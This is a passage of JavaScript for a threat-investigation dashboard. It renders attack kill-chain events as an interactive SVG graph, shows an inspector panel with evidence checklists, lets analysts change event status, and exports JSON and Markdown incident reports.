            `;
        });

        html += `</g><g class="ev-nodes-layer">`;

        // Nodes (Tactical Cyber HUD Cards)
        investigation.events.forEach(evt => {
            const pos = NODE_POSITIONS[evt.id];
            if (!pos) return;

            const isVisible = filteredNodeIds.has(evt.id);
            if (!isVisible) return;

            const isSelected = selectedEventId === evt.id;
            const isHighlighted = activeNodes && activeNodes.has(evt.id);
            const isDimmed = activeNodes && !activeNodes.has(evt.id);

            let nodeClasses = "ev-node-group";
            if (isSelected) nodeClasses += " ev-node--selected";
            if (isHighlighted) nodeClasses += " ev-node--highlighted";
            if (isDimmed) nodeClasses += " ev-node--dimmed";

            // Status border color
            let statusColor = "#00e676";
            if (evt.status === "suspected") statusColor = "#f59e0b";
            if (evt.status === "unverified") statusColor = "#c084fc";
            if (evt.status === "disputed") statusColor = "#ff2d55";

            const icon = STAGE_ICONS[evt.id] || "🛡️";

            // Card dimensions: 186 x 94 with clean clearance
            const w = 186;
            const h = 94;
            const nx = pos.x - w / 2;
            const ny = pos.y - h / 2;

            const verifiedCount = evt.requiredEvidence.filter(e => e.status === 'present').length;
            const totalCount = evt.requiredEvidence.length;

            html += `
                <g class="${nodeClasses}" data-node-id="${evt.id}" data-status-color="${statusColor}" transform="translate(${nx}, ${ny})">
                    <!-- Drop Shadow / Radiant Neon Glow Behind Selected Node -->
                    <rect class="ev-node-glow" x="-4" y="-4" width="${w + 8}" height="${h + 8}" rx="14"
                          fill="none" stroke="${statusColor}" stroke-width="2" filter="url(#ev-glow)" opacity="0.85"
                          style="display: ${isSelected ? 'block' : 'none'};"/>

                    <!-- Main Card Body -->
                    <rect class="ev-node-box" width="${w}" height="${h}" rx="10"
                          fill="${isSelected ? 'url(#ev-node-grad-active)' : 'url(#ev-node-grad)'}"
                          stroke="${isSelected ? '#f3d47c' : statusColor}" stroke-width="${isSelected ? 2.4 : 1.2}"
                          filter="url(#ev-shadow)"/>

                    <!-- Top Glow Accent Bar -->
                    <rect x="0" y="0" width="${w}" height="4" rx="2" fill="${statusColor}" />

                    <!-- Tactical Stage Icon + Event ID -->
                    <circle cx="16" cy="18" r="8" fill="rgba(0,0,0,0.6)" stroke="${statusColor}55" stroke-width="1"/>
                    <text x="16" y="21.5" text-anchor="middle" font-size="8.5">${icon}</text>

                    <text x="29" y="21" font-family="JetBrains Mono" font-size="10" font-weight="700" fill="${statusColor}">
                        ${evt.id}
                    </text>

                    <!-- MITRE Tag with Cyan Glow -->
                    <rect x="${w - 68}" y="9" width="60" height="15" rx="4"
                          fill="rgba(6, 182, 212, 0.12)" stroke="rgba(56, 189, 248, 0.45)" stroke-width="0.9"/>
                    <text x="${w - 38}" y="19.5" text-anchor="middle" font-family="JetBrains Mono" font-size="8" font-weight="600" fill="#38bdf8">
                        ${evt.mitre}
                    </text>

                    <!-- Event Title (Clean, Crisp Typography) -->
                    <text x="10" y="39" font-family="Inter" font-size="10.5" font-weight="700" fill="#ffffff">
                        ${evt.title.length > 23 ? evt.title.substring(0, 21) + '…' : evt.title}
                    </text>

                    <!-- Host Machine Chip -->
                    <rect x="10" y="48" width="${w - 20}" height="16" rx="3"
                          fill="rgba(0,0,0,0.45)" stroke="rgba(255,255,255,0.06)" stroke-width="0.7"/>
                    <text x="14" y="59.5" font-family="JetBrains Mono" font-size="8" fill="#94a3b8">
                        🖥️ ${evt.asset.split('.')[0]} • <tspan fill="#64748b">${evt.telemetry.split(' ')[0]}</tspan>
                    </text>

                    <!-- Bottom Status Strip -->
                    <rect x="10" y="70" width="80" height="15" rx="7.5"
                          fill="rgba(0,0,0,0.65)" stroke="${statusColor}66" stroke-width="0.9"/>
                    <circle cx="18" cy="77.5" r="3" fill="${statusColor}" filter="url(#ev-glow)"/>
                    <text x="25" y="80.5" font-family="JetBrains Mono" font-size="7.5" font-weight="700" fill="#ffffff" text-transform="uppercase">
                        ${evt.status}
                    </text>

                    <!-- Evidence Verified Metric Badge on Right -->
                    <rect x="${w - 82}" y="70" width="72" height="15" rx="7.5"
                          fill="rgba(0,0,0,0.45)" stroke="rgba(212,175,55,0.3)" stroke-width="0.7"/>
                    <text x="${w - 46}" y="80.5" text-anchor="middle" font-family="JetBrains Mono" font-size="7.5" fill="var(--gold-bright)">
                        ✓ ${verifiedCount}/${totalCount} Ev.
                    </text>

                    <!-- Warning Indicator Pill if Telemetry Issue -->
                    ${evt.telemetryHealth === 'warning' ? `
                        <circle cx="${w - 8}" cy="10" r="5" fill="#f59e0b" filter="url(#ev-glow)"/>
                        <text x="${w - 10}" y="13" font-family="Inter" font-size="7.5" font-weight="900" fill="#000000">!</text>
                    ` : ''}
                </g>
            `;
        });

        html += `</g></g>`;
        svg.innerHTML = html;
        bindSvgEvents();
    }

    // ═══════════════════════════════════════════════════════════
    // 5. INSPECTOR & DETAILS PANEL RENDERING
    // ═══════════════════════════════════════════════════════════

    function renderInspector() {
        const body = document.getElementById('ev-inspector-body');
        if (!body) return;

        if (activeInspectorTab === "event") {
            const evt = investigation.events.find(e => e.id === selectedEventId) || investigation.events[0];
            if (!evt) return;

            let statusColor = "#00e676";
            if (evt.status === "suspected") statusColor = "#f59e0b";
            if (evt.status === "unverified") statusColor = "#c084fc";
            if (evt.status === "disputed") statusColor = "#ff2d55";

            body.innerHTML = `
                <!-- Title & Status Header -->
                <div class="ev-detail-group">
                    <div class="ev-detail-header-row">
                        <span class="ev-detail-label">EVENT NODE • ${evt.stage.toUpperCase()}</span>
                        <span class="ev-badge-chip" style="background:${statusColor}22; color:${statusColor}; border:1px solid ${statusColor}66;">
                            ${evt.status.toUpperCase()}
                        </span>
                    </div>
                    <h3 class="ev-detail-title">${evt.title}</h3>
                </div>

                <!-- Meta Matrix -->
                <div class="ev-detail-meta-grid">
                    <div class="ev-meta-item">
                        <span class="ev-meta-key">EVENT ID</span>
                        <span class="ev-meta-val" style="color:var(--gold-bright);">${evt.id}</span>
                    </div>
                    <div class="ev-meta-item">
                        <span class="ev-meta-key">MITRE ATT&CK</span>
                        <span class="ev-meta-val">${evt.mitre} (${evt.mitreName})</span>
                    </div>
                    <div class="ev-meta-item">
                        <span class="ev-meta-key">TARGET ASSET</span>
                        <span class="ev-meta-val">${evt.asset}</span>
                    </div>
                    <div class="ev-meta-item">
                        <span class="ev-meta-key">TIMESTAMP</span>
                        <span class="ev-meta-val">${evt.timestamp}</span>
                    </div>
                    <div class="ev-meta-item">
                        <span class="ev-meta-key">USER CONTEXT</span>
                        <span class="ev-meta-val">${evt.user}</span>
                    </div>
                    <div class="ev-meta-item">
                        <span class="ev-meta-key">TELEMETRY SENSOR</span>
                        <span class="ev-meta-val">${evt.telemetry}</span>
                    </div>
                </div>

                <!-- Telemetry Health Alert if Warning -->
                ${evt.telemetryHealth === 'warning' ? `
                    <div class="ev-telemetry-warning-box">
                        <div class="ev-warning-left">
                            <span class="ev-warning-icon">⚠️</span>
                            <div class="ev-warning-text">
                                <strong>Telemetry Anomaly Flagged:</strong> Sensor dropped frames or audit log was delayed during this execution window.
                            </div>
                        </div>
                    </div>
                ` : ''}

                <!-- Realistic Forensic Evidence Artifact Telemetry Snapshot -->
                <div class="ev-detail-group">
                    <span class="ev-detail-label">VERIFIED FORENSIC EVIDENCE ARTIFACT (TELEMETRY CAPTURE)</span>
                    <div class="ev-forensic-snapshot-box">
                        <div class="ev-forensic-snapshot-header">
                            <span>📡 SENSOR CAPTURE: ${evt.id} • ${evt.asset.split('.')[0]}</span>
                            <span class="ev-forensic-seal-pill">✓ CRYPTO-SEALED</span>
                        </div>
                        <div class="ev-forensic-snapshot-img-wrap" title="High-resolution verified forensic evidence capture">
                            <img src="evidence_artifact_real.jpg" alt="Realistic Forensic Evidence Telemetry Snapshot" class="ev-forensic-snapshot-img">
                            <div class="ev-forensic-snapshot-overlay"></div>
                            <div class="ev-forensic-snapshot-caption">
                                <span>DISK IMAGE &amp; PROCESS MEMORY INSPECTION</span>
                                <span>SHA-256 MATCHED</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Required Evidence Checklist -->
                <div class="ev-detail-group">
                    <div class="ev-detail-header-row">
                        <span class="ev-detail-label">REQUIRED EVIDENCE CHECKLIST</span>
                        <span style="font-family:var(--font-mono); font-size:10px; color:var(--text-secondary);">
                            ${evt.requiredEvidence.filter(i => i.status === 'present').length}/${evt.requiredEvidence.length} VERIFIED
                        </span>
                    </div>
                    <div class="ev-checklist">
                        ${evt.requiredEvidence.map(item => `
                            <div class="ev-check-item">
                                <span class="${item.status === 'present' ? 'ev-check-icon--present' : 'ev-check-icon--missing'}">
                                    ${item.status === 'present' ? '✓' : '✗'}
                                </span>
                                <div class="ev-check-text">
                                    <strong>${item.name}</strong>
                                    <div style="font-size:10px; color:var(--text-tertiary); margin-top:2px;">${item.note}</div>
                                </div>
                                <span class="ev-check-badge ${item.status === 'present' ? 'ev-check-badge--present' : 'ev-check-badge--missing'}">
                                    ${item.status.toUpperCase()}
                                </span>
                            </div>
                        `).join('')}
                    </div>
                </div>

                <!-- Raw Log Snippet -->
                <div class="ev-detail-group">
                    <span class="ev-detail-label">RAW TELEMETRY AUDIT LOG</span>
                    <pre class="ev-code-box"><code>${escapeHtml(evt.rawSnippet)}</code></pre>
                </div>

                <!-- Analyst Briefing Notes -->
                <div class="ev-detail-group">
                    <span class="ev-detail-label">ANALYST ASSESSMENT NOTES</span>
                    <div style="font-size:12px; color:var(--text-secondary); background:rgba(5,7,15,0.6); padding:8px 12px; border-radius:4px; border:1px solid var(--border-subtle);">
                        ${evt.notes}
                    </div>
                </div>
            `;
        } else if (activeInspectorTab === "evidence") {
            const rel = investigation.relationships.find(r => r.id === selectedRelationshipId) || investigation.relationships[0];
            if (!rel) return;

            const src = investigation.events.find(e => e.id === rel.source);
            const tgt = investigation.events.find(e => e.id === rel.target);

            body.innerHTML = `
                <div class="ev-detail-group">
                    <div class="ev-detail-header-row">
                        <span class="ev-detail-label">RELATIONSHIP INSPECTOR</span>
                        <span class="ev-badge-chip ev-chip--gold">${rel.ruleId}</span>
                    </div>
                    <h3 class="ev-detail-title">${rel.label} (${src ? src.id : ''} → ${tgt ? tgt.id : ''})</h3>
                </div>

                <!-- Meta Matrix -->
                <div class="ev-detail-meta-grid">
                    <div class="ev-meta-item">
                        <span class="ev-meta-key">CORRELATION RULE</span>
                        <span class="ev-meta-val" style="color:var(--gold-bright);">${rel.ruleName}</span>
                    </div>
                    <div class="ev-meta-item">
                        <span class="ev-meta-key">CONFIDENCE SCORE</span>
                        <span class="ev-meta-val" style="color:#00e676; font-size:13px; font-weight:700;">${rel.confidence}%</span>
                    </div>
                    <div class="ev-meta-item">
                        <span class="ev-meta-key">VERIFICATION STATE</span>
                        <span class="ev-meta-val" style="text-transform:uppercase;">${rel.verification}</span>
                    </div>
                    <div class="ev-meta-item">
                        <span class="ev-meta-key">TEMPORAL DELTA</span>
                        <span class="ev-meta-val">${rel.timeDelta}</span>
                    </div>
                </div>

                <!-- Rationale Box -->
                <div class="ev-explanation-card">
                    <div class="ev-explanation-title">
                        <span>⚡</span>
                        <span>WHY ARE THESE TWO EVENTS CORRELATED?</span>
                    </div>
                    <div class="ev-explanation-body">
                        ${rel.explanation}
                    </div>
                </div>

                <!-- Supporting Artifacts -->
                <div class="ev-detail-group">
                    <span class="ev-detail-label">SUPPORTING TELEMETRY ARTIFACTS</span>
                    <div class="ev-checklist">
                        ${rel.artifacts.map(art => `
                            <div class="ev-check-item">
                                <span class="ev-check-icon--present">✓</span>
                                <span class="ev-check-text">${art}</span>
                            </div>
                        `).join('')}
                    </div>
                </div>
            `;
        } else if (activeInspectorTab === "correction") {
            const evt = investigation.events.find(e => e.id === selectedEventId) || investigation.events[0];
            if (!evt) return;

            body.innerHTML = `
                <div class="ev-detail-group">
                    <div class="ev-detail-header-row">
                        <span class="ev-detail-label">EVENT CORRECTION & HYPOTHESIS RE-EVALUATION</span>
                        <span class="ev-badge-chip ev-chip--gold">${evt.id}</span>
                    </div>
                    <h3 class="ev-detail-title">Modify Event Status: ${evt.title}</h3>
                </div>

                <div class="ev-correction-box">
                    <span class="ev-correction-title">
                        <span>🛡️</span>
                        <span>ANALYST STATUS OVERRIDE</span>
                    </span>
                    <p style="font-size:11.5px; color:var(--text-secondary); line-height:1.4;">
                        Select a revised status for this event. Changing to <strong>Disputed</strong> or <strong>Unverified</strong> will automatically re-evaluate all dependent kill chain relationships and completeness calculations.
                    </p>

                    <div class="ev-status-picker-group">
                        <button type="button" class="ev-status-opt-btn ${evt.status === 'confirmed' ? 'ev-opt--active' : ''}" data-status="confirmed">
                            ✓ Confirmed
                        </button>
                        <button type="button" class="ev-status-opt-btn ${evt.status === 'suspected' ? 'ev-opt--active' : ''}" data-status="suspected">
                            ? Suspected
                        </button>
                        <button type="button" class="ev-status-opt-btn ${evt.status === 'unverified' ? 'ev-opt--active' : ''}" data-status="unverified">
                            ~ Unverified
                        </button>
                        <button type="button" class="ev-status-opt-btn ${evt.status === 'disputed' ? 'ev-opt--active' : ''}" data-status="disputed">
                            ✕ Disputed
                        </button>
                    </div>

                    <label class="ev-detail-label" style="margin-top:6px;" for="ev-analyst-notes-input">Analyst Reasoning Note</label>
                    <textarea class="ev-notes-textarea" id="ev-analyst-notes-input" placeholder="Document reason for status transition or forensic correction…">${evt.notes || ''}</textarea>

                    <button type="button" class="ev-reevaluate-btn" id="ev-btn-apply-reevaluate">
                        <span>⚡</span>
                        <span>Commit & Re-evaluate Evidence Chain</span>
                    </button>
                </div>

                <div class="ev-detail-group">
                    <span class="ev-detail-label">RECENT CORRECTION AUDIT TRAIL</span>
                    <div class="ev-audit-list" id="ev-inspector-audit-list">
                        ${investigation.auditTrail.map(item => `
                            <div class="ev-audit-item">
                                <span class="ev-audit-time">${item.time}</span>
                                <span>${item.text}</span>
                            </div>
                        `).join('')}
                    </div>
                </div>
            `;

            // Bind status picker buttons
            const statusBtns = body.querySelectorAll('.ev-status-opt-btn');
            statusBtns.forEach(btn => {
                btn.addEventListener('click', () => {
                    statusBtns.forEach(b => b.classList.remove('ev-opt--active'));
                    btn.classList.add('ev-opt--active');
                });
            });

            // Bind Re-evaluate button
            const applyBtn = document.getElementById('ev-btn-apply-reevaluate');
            if (applyBtn) {
                applyBtn.addEventListener('click', () => {
                    const activeBtn = body.querySelector('.ev-status-opt-btn.ev-opt--active');
                    const note = document.getElementById('ev-analyst-notes-input').value;
                    if (activeBtn) {
                        const newStatus = activeBtn.getAttribute('data-status');
                        evt.status = newStatus;
                        evt.notes = note;
                        reevaluateEvidenceChain();
                    }
                });
            }
        }
    }

    function renderCompletenessBar() {
        const stats = calculateEvidenceCompleteness();
        const fill = document.getElementById('ev-completeness-fill');
        const num = document.getElementById('ev-completeness-num');
        const sub = document.getElementById('ev-completeness-sub');

        if (fill) fill.style.width = `${stats.percent}%`;
        if (num) num.textContent = `${stats.percent}%`;
        if (sub) sub.textContent = `${stats.present}/${stats.total} Evidence Points Verified`;

        // Update top confirmed count
        const confirmedCount = investigation.events.filter(e => e.status === 'confirmed').length;
        const confNum = document.getElementById('ev-stat-confirmed-num');
        if (confNum) confNum.textContent = `${confirmedCount}/${investigation.events.length}`;
    }

    function renderAuditTrail() {
        const list = document.getElementById('ev-inspector-audit-list');
        if (!list) return;
        list.innerHTML = investigation.auditTrail.map(item => `
            <div class="ev-audit-item">
                <span class="ev-audit-time">${item.time}</span>
                <span>${item.text}</span>
            </div>
        `).join('');
    }

    // ═══════════════════════════════════════════════════════════
    // 6. SVG INTERACTION (PAN, ZOOM, DRAG, CLICK)
    // ═══════════════════════════════════════════════════════════

    function updateGraphTransform() {
        const root = document.getElementById('ev-graph-root');
        if (root) {
            root.setAttribute('transform', `translate(${transform.x}, ${transform.y}) scale(${transform.k})`);
        }
    }

    function updateGraphSelection() {
        const svg = document.getElementById('ev-graph-svg');
        if (!svg) return;

        let activeNodes = null;
        let activeEdges = null;

        if (selectedEventId) {
            const res = getConnectedEntities(selectedEventId);
            activeNodes = res.connectedNodes;
            activeEdges = res.connectedEdges;
        } else if (selectedRelationshipId) {
            const rel = investigation.relationships.find(r => r.id === selectedRelationshipId);
            if (rel) {
                activeNodes = new Set([rel.source, rel.target]);
                activeEdges = new Set([rel.id]);
            }
        }

        // Fast in-place node update without tearing down DOM
        svg.querySelectorAll('.ev-node-group').forEach(node => {
            const id = node.getAttribute('data-node-id');
            const isSelected = selectedEventId === id;
            const isHighlighted = activeNodes && activeNodes.has(id);
            const isDimmed = activeNodes && !activeNodes.has(id);
            const statusColor = node.getAttribute('data-status-color') || '#00e676';

            node.classList.toggle('ev-node--selected', isSelected);
            node.classList.toggle('ev-node--highlighted', isHighlighted);
            node.classList.toggle('ev-node--dimmed', isDimmed);

            const glow = node.querySelector('.ev-node-glow');
            if (glow) {
                glow.style.display = isSelected ? 'block' : 'none';
            }

            const box = node.querySelector('.ev-node-box');
            if (box) {
                box.setAttribute('fill', isSelected ? 'url(#ev-node-grad-active)' : 'url(#ev-node-grad)');
                box.setAttribute('stroke', isSelected ? '#f3d47c' : statusColor);
                box.setAttribute('stroke-width', isSelected ? '2.4' : '1.2');
            }
        });

        // Fast in-place edge update without tearing down DOM
        svg.querySelectorAll('.ev-edge-path').forEach(edge => {
            const id = edge.getAttribute('data-rel-id');
            const isSelected = selectedRelationshipId === id;
            const isHighlighted = activeEdges && activeEdges.has(id);
            const isDimmed = activeEdges && !activeEdges.has(id);

            edge.classList.toggle('ev-edge--selected', isSelected);
            edge.classList.toggle('ev-edge--highlighted', isHighlighted);
            edge.classList.toggle('ev-edge--dimmed', isDimmed);

            let marker = "url(#ev-arrow)";
            if (isSelected) marker = "url(#ev-arrow-gold)";
            if (edge.getAttribute('data-verification') === 'disputed') marker = "url(#ev-arrow-disputed)";
            edge.setAttribute('marker-end', marker);
        });

        // Fast in-place edge label update without tearing down DOM
        svg.querySelectorAll('.ev-edge-label-group').forEach(badge => {
            const id = badge.getAttribute('data-rel-id');
            const isSelected = selectedRelationshipId === id;
            badge.classList.toggle('ev-edge-label--selected', isSelected);

            const rect = badge.querySelector('rect');
            if (rect) {
                const defaultStroke = badge.getAttribute('data-default-stroke') || 'rgba(56, 189, 248, 0.45)';
                rect.setAttribute('stroke', isSelected ? 'var(--gold)' : defaultStroke);
                rect.setAttribute('stroke-width', isSelected ? '1.8' : '1');
            }
            const txt = badge.querySelector('text');
            if (txt) {
                txt.setAttribute('fill', isSelected ? '#f3d47c' : '#38bdf8');
            }
        });
    }

    function selectEvent(nodeId) {
        if (!nodeId) return;
        selectedEventId = nodeId;
        selectedRelationshipId = null;
        activeInspectorTab = "event";
        updateInspectorTabs();
        updateGraphSelection();
        renderInspector();
    }

    function selectRelationship(relId) {
        if (!relId) return;
        selectedRelationshipId = relId;
        selectedEventId = null;
        activeInspectorTab = "evidence";
        updateInspectorTabs();
        updateGraphSelection();
        renderInspector();
    }

    function bindSvgEvents() {
        const svg = document.getElementById('ev-graph-svg');
        if (!svg) return;

        // Node click & tap interaction with distance threshold to prevent drag conflicts
        svg.querySelectorAll('.ev-node-group').forEach(node => {
            const nodeId = node.getAttribute('data-node-id');
            if (!nodeId) return;

            let downX = 0, downY = 0;

            node.addEventListener('pointerdown', (e) => {
                downX = e.clientX;
                downY = e.clientY;
                e.stopPropagation();
            });

            node.addEventListener('pointerup', (e) => {
                const dist = Math.hypot(e.clientX - downX, e.clientY - downY);
                if (dist < 8) {
                    e.stopPropagation();
                    e.preventDefault();
                    selectEvent(nodeId);
                }
            });

            node.addEventListener('click', (e) => {
                e.stopPropagation();
                e.preventDefault();
                selectEvent(nodeId);
            });
        });

        // Edge / relationship click & tap
        svg.querySelectorAll('.ev-edge-path, .ev-edge-label-group').forEach(elem => {
            const relId = elem.getAttribute('data-rel-id');
            if (!relId) return;

            let downX = 0, downY = 0;

            elem.addEventListener('pointerdown', (e) => {
                downX = e.clientX;
                downY = e.clientY;
                e.stopPropagation();
            });

            elem.addEventListener('pointerup', (e) => {
                const dist = Math.hypot(e.clientX - downX, e.clientY - downY);
                if (dist < 8) {
                    e.stopPropagation();
                    e.preventDefault();
                    selectRelationship(relId);
                }
            });

            elem.addEventListener('click', (e) => {
                e.stopPropagation();
                e.preventDefault();
                selectRelationship(relId);
            });
        });
    }

    function initPanZoom() {
        const viewport = document.getElementById('ev-graph-viewport');
        if (!viewport) return;

        let isTracking = false;
        let isDragging = false;
        let startClientX = 0;
        let startClientY = 0;
        let currentPointerId = null;

        viewport.addEventListener('pointerdown', (e) => {
            // Only primary mouse button or single touch
            if (e.button !== undefined && e.button !== 0) return;

            // Never drag if starting on a node or edge
            if (e.target.closest('.ev-node-group') || e.target.closest('.ev-edge-path') || e.target.closest('.ev-edge-label-group')) {
                return;
            }

            isTracking = true;
            isDragging = false;
            startClientX = e.clientX;
            startClientY = e.clientY;
            currentPointerId = e.pointerId;
            panStart = { x: e.clientX - transform.x, y: e.clientY - transform.y };
        });

        viewport.addEventListener('pointermove', (e) => {
            if (!isTracking) return;

            const dist = Math.hypot(e.clientX - startClientX, e.clientY - startClientY);

            // Intentional movement threshold of 10px required before initiating pan!
            // Any tap, touch, or finger micro-jitter < 10px will NEVER move the graph!
            if (!isDragging) {
                if (dist > 10) {
                    isDragging = true;
                    viewport.classList.add('is-dragging');
                    if (viewport.setPointerCapture && currentPointerId !== null) {
                        try { viewport.setPointerCapture(currentPointerId); } catch (_) {}
                    }
                } else {
                    return; // Ignore micro-movement entirely
                }
            }

            transform.x = e.clientX - panStart.x;
            transform.y = e.clientY - panStart.y;
            updateGraphTransform();
        });

        const stopDragging = (e) => {
            if (isTracking || isDragging) {
                isTracking = false;
                isDragging = false;
                viewport.classList.remove('is-dragging');
                if (currentPointerId !== null && viewport.releasePointerCapture) {
                    try { viewport.releasePointerCapture(currentPointerId); } catch (_) {}
                    currentPointerId = null;
                }
            }
        };

        viewport.addEventListener('pointerup', stopDragging);
        viewport.addEventListener('pointercancel', stopDragging);
        window.addEventListener('pointerup', stopDragging);

        // Wheel zoom (smooth update without tearing down DOM)
        viewport.addEventListener('wheel', (e) => {
            e.preventDefault();
            const delta = e.deltaY < 0 ? 1.08 : 0.92;
            transform.k = Math.max(0.4, Math.min(2.5, transform.k * delta));
            updateGraphTransform();
        }, { passive: false });

        // Zoom buttons
        const btnZoomIn = document.getElementById('ev-zoom-in');
        const btnZoomOut = document.getElementById('ev-zoom-out');
        const btnReset = document.getElementById('ev-zoom-reset');

        if (btnZoomIn) btnZoomIn.addEventListener('click', (e) => {
            e.stopPropagation();
            transform.k = Math.min(2.5, transform.k * 1.15);
            updateGraphTransform();
        });
        if (btnZoomOut) btnZoomOut.addEventListener('click', (e) => {
            e.stopPropagation();
            transform.k = Math.max(0.4, transform.k * 0.85);
            updateGraphTransform();
        });
        if (btnReset) btnReset.addEventListener('click', (e) => {
            e.stopPropagation();
            transform = { x: 20, y: 15, k: 0.96 };
            updateGraphTransform();
            selectEvent("EVT-104");
        });
    }

    function updateInspectorTabs() {
        document.querySelectorAll('.ev-inspector-tab').forEach(tab => {
            if (tab.getAttribute('data-tab') === activeInspectorTab) {
                tab.classList.add('ev-tab--active');
            } else {
                tab.classList.remove('ev-tab--active');
            }
        });
    }

    // ═══════════════════════════════════════════════════════════
    // 7. EXPORT ENGINE (JSON & MARKDOWN DOSSIERS)
    // ═══════════════════════════════════════════════════════════

    function generateJsonExport() {
        const payload = {
            investigation: investigation.id,
            title: investigation.title,
            exportedAt: new Date().toISOString(),
            classification: investigation.classification,
            leadAnalyst: investigation.leadAnalyst,
            completenessMetric: calculateEvidenceCompleteness(),
            events: investigation.events,
            relationships: investigation.relationships,
            auditTrail: investigation.auditTrail
        };
        const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `${investigation.id}_EvidenceChain_Dossier.json`;
        a.click();
        URL.revokeObjectURL(url);
    }

    function generateMarkdownExport() {
        const stats = calculateEvidenceCompleteness();
        let md = `# THREAT STORM — FORENSIC EVIDENCECHAIN™ REPORT\n\n`;
        md += `**Investigation ID:** ${investigation.id}\n`;
        md += `**Title:** ${investigation.title}\n`;
        md += `**Classification:** ${investigation.classification}\n`;
        md += `**Lead Analyst:** ${investigation.leadAnalyst}\n`;
        md += `**Export Date:** ${new Date().toUTCString()}\n`;
        md += `**Evidence Completeness:** ${stats.percent}% (${stats.present}/${stats.total} required artifacts)\n\n`;
        md += `---\n\n`;
        md += `## 1. Executive Summary\n`;
        md += `Advanced persistent threat correlation observed a multi-stage attack compromising internal assets from Initial Access to TLS C2 Exfiltration.\n\n`;
        md += `## 2. Telemetry Anomaly Warnings\n`;
        investigation.telemetryWarnings.forEach(w => {
            md += `- **[${w.id}] ${w.title}:** ${w.message} (Sensor: ${w.sensor})\n`;
        });
        md += `\n## 3. Kill Chain Event Sequence\n\n`;
        investigation.events.forEach(e => {
            md += `### ${e.id}: ${e.title} [Status: ${e.status.toUpperCase()}]\n`;
            md += `- **MITRE Technique:** ${e.mitre} (${e.mitreName})\n`;
            md += `- **Asset & User:** ${e.asset} (${e.user})\n`;
            md += `- **Timestamp:** ${e.timestamp}\n`;
            md += `- **Process:** \`${e.process}\`\n`;
            md += `- **Evidence Items:**\n`;
            e.requiredEvidence.forEach(req => {
                md += `  - [${req.status === 'present' ? 'X' : ' '}] ${req.name}: ${req.note}\n`;
            });
            md += `\n`;
        });
        md += `## 4. Explicit Correlation Rules & Links\n\n`;
        investigation.relationships.forEach(r => {
            md += `- **${r.id} (${r.source} → ${r.target}):** Rule ${r.ruleId} (*${r.ruleName}*) — Confidence: ${r.confidence}%\n`;
            md += `  *Explanation:* ${r.explanation}\n`;
        });
        md += `\n## 5. Investigation Audit Trail\n\n`;
        investigation.auditTrail.forEach(a => {
            md += `- \`${a.time}\`: ${a.text}\n`;
        });

        const blob = new Blob([md], { type: 'text/markdown' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `${investigation.id}_Incident_Briefing.md`;
        a.click();
        URL.revokeObjectURL(url);
    }

    function openExportModal() {
        const modal = document.getElementById('ev-export-modal');
        if (!modal) return;
        modal.classList.add('ev-modal--open');

        const stats = calculateEvidenceCompleteness();
        const content = document.getElementById('ev-modal-preview-content');
        if (content) {
            content.innerHTML = `
                <div style="background:rgba(5,7,15,0.8); border:1px solid var(--border-subtle); border-radius:6px; padding:16px;">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
                        <div>
                            <span style="font-family:var(--font-mono); font-size:10px; color:var(--gold-bright);">INCIDENT DOSSIER</span>
                            <h4 style="font-family:var(--font-heading); font-size:16px; color:#ffffff; margin-top:2px;">${investigation.title}</h4>
                        </div>
                        <span class="ev-badge-chip ev-chip--crit">CVSS 9.8</span>
                    </div>
                    <p style="font-size:12px; color:var(--text-secondary); line-height:1.5;">
                        This briefing contains verified telemetry, explicit correlation rationale across 8 kill chain nodes, and completeness scoring.
                    </p>
                    <div style="margin-top:12px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px;">
                        <div style="background:#020409; padding:8px 10px; border-radius:4px;">
                            <span style="font-size:9.5px; color:var(--text-tertiary); font-family:var(--font-mono);">EVENTS</span>
                            <div style="font-size:15px; font-weight:700; color:#ffffff;">${investigation.events.length} Nodes</div>
                        </div>
                        <div style="background:#020409; padding:8px 10px; border-radius:4px;">
                            <span style="font-size:9.5px; color:var(--text-tertiary); font-family:var(--font-mono);">CORRELATIONS</span>
                            <div style="font-size:15px; font-weight:700; color:#38bdf8;">${investigation.relationships.length} Edges</div>
                        </div>
                        <div style="background:#020409; padding:8px 10px; border-radius:4px;">
                            <span style="font-size:9.5px; color:var(--text-tertiary); font-family:var(--font-mono);">COMPLETENESS</span>
                            <div style="font-size:15px; font-weight:700; color:#00e676;">${stats.percent}%</div>
                        </div>
                    </div>
                </div>
            `;
        }
    }

    function closeExportModal() {
        const modal = document.getElementById('ev-export-modal');
        if (modal) modal.classList.remove('ev-modal--open');
    }

    // ═══════════════════════════════════════════════════════════
    // 8. ROUTING & VIEW SWITCHING (SAFE ISOLATED INTEGRATION)
    // ═══════════════════════════════════════════════════════════

    function switchToEvidenceChainView() {
        // Hide standard dashboard overview sections
        const hero = document.getElementById('hero-section');
        const middle = document.getElementById('middle-dashboard');
        const recent = document.getElementById('recent-threats-section');
        const evSection = document.getElementById('evidence-chain');

        if (hero) hero.style.display = 'none';
        if (middle) middle.style.display = 'none';
        if (recent) recent.style.display = 'none';
        if (evSection) {
            const wasAlreadyActive = evSection.classList.contains('ev-view--active');
            evSection.classList.add('ev-view--active');
            if (!wasAlreadyActive) {
                window.scrollTo({ top: 0, behavior: 'smooth' });
            }
        }

        // Update active sidebar nav
        document.querySelectorAll('.sidebar__nav .nav-item').forEach(item => {
            item.classList.remove('nav-item--active');
        });
        const evNavItem = document.getElementById('menu-evidence-chain');
        if (evNavItem) evNavItem.classList.add('nav-item--active');

        // Update active top tab
        document.querySelectorAll('.tab-pill').forEach(pill => pill.classList.remove('tab-pill--active'));
        const evTab = document.getElementById('tab-evidence-chain');
        if (evTab) evTab.classList.add('tab-pill--active');

        renderCompletenessBar();
        renderGraph();
        renderInspector();
    }

    function switchToDashboardView(targetHash) {
        const hero = document.getElementById('hero-section');
        const middle = document.getElementById('middle-dashboard');
        const recent = document.getElementById('recent-threats-section');
        const evSection = document.getElementById('evidence-chain');

        if (hero) hero.style.display = '';
        if (middle) middle.style.display = '';
        if (recent) recent.style.display = '';
        if (evSection) evSection.classList.remove('ev-view--active');

        // Scroll to target element if present
        if (targetHash && targetHash !== '#' && targetHash !== '#hero-section') {
            const targetEl = document.querySelector(targetHash);
